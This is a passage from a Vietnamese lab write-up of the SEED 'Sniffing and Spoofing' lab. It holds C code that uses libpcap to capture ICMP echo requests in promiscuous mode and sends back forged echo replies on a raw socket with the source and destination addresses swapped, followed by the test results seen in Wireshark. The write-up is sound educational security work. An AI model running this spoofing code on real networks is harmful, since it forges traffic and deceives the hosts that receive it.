    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;
    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

void send_echo_reply(struct ipheader * ip) {
  int ip_header_len = ip->iph_ihl * 4;
  const char buffer[PACKET_LEN];

  memset((char*)buffer, 0, PACKET_LEN);
  memcpy((char*)buffer, ip, ntohs(ip->iph_len));
  struct ipheader* newip = (struct ipheader*)buffer;
  struct icmpheader* newicmp = (struct icmpheader*)(buffer + ip_header_len);

  newip->iph_sourceip = ip->iph_destip;
  newip->iph_destip = ip->iph_sourceip;
  newip->iph_ttl = 64;

  newicmp->icmp_type = 0;

  send_raw_ip_packet (newip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,  const u_char *packet) {
  struct ethheader *eth = (struct ethheader *)packet;

  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader * ip = (struct ipheader *)
                           (packet + sizeof(struct ethheader)); 

    printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));  
    printf("         To: %s\n", inet_ntoa(ip->iph_destip));   

    switch(ip->iph_protocol) {                               
        case IPPROTO_TCP:
            printf("   Protocol: TCP\n");
            return;
        case IPPROTO_UDP:
            printf("   Protocol: UDP\n");
            return;
        case IPPROTO_ICMP:
            printf("   Protocol: ICMP\n");
			send_echo_reply(ip);
            return;
        default:
            printf("   Protocol: others\n");
            return;
    }
  }
}

int main() {
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  
  char filter_exp[] = "icmp[icmptype] = 8";
  
  bpf_u_int32 net;

  handle = pcap_open_live("br-91a1f05a03f3", BUFSIZ, 1, 1000, errbuf); 

  pcap_compile(handle, &fp, filter_exp, 0, net);      
  pcap_setfilter(handle, &fp);                             

  pcap_loop(handle, -1, got_packet, NULL);               
  pcap_close(handle);   
  return 0;
}
```

Ở chương trình này, chúng ta cần dùng 3 headers là ethernet, IP và ICMP. Đầu tiên, chúng ta sẽ sniff packet và in ra thông tin của chúng:

![](https://i.imgur.com/DYismy5.png)

Bật chế độ promiscuous mode, set filter và gán interface. Sau khi nhận được gói tin, chúng ta tạo gói ICMP với type = 0 là echo reply để gửi lại cho người gửi:

![](https://i.imgur.com/BTfuVQp.png)

*Lưu ý: chúng ta cần phải swap src và dst của packet trước để có thể gửi lại:*

![](https://i.imgur.com/calSDcd.png)

Để test thử chương trình, chúng ta cho máy user container chạy lệnh ping tới 8.8.8.8 trong khi attacker chạy chương trình monitor các traffic:

![](https://i.imgur.com/LNvsLJG.png)

![](https://i.imgur.com/nUmo4LO.png)

![](https://i.imgur.com/YDOnyks.png)

Ở kết quả wireshark, chúng ta có thể thấy được là có 2 packet liền kề nhau được trả về cho user container, 1 là của google.com và 2 là của attacker.

> **Vậy, chúng ta đã hoàn thành mục tiêu sniff and spoof packet đồng thời kết thúc bài lab tại đây.**

References:
* https://www.ibm.com/docs/en/qsip/7.4?topic=applications-icmp-type-code-ids
* https://seedsecuritylabs.org/Labs_20.04/Files/Sniffing_Spoofing/Sniffing_Spoofing.pdf
* https://www.tcpdump.org/manpages/pcap-filter.7.html

---
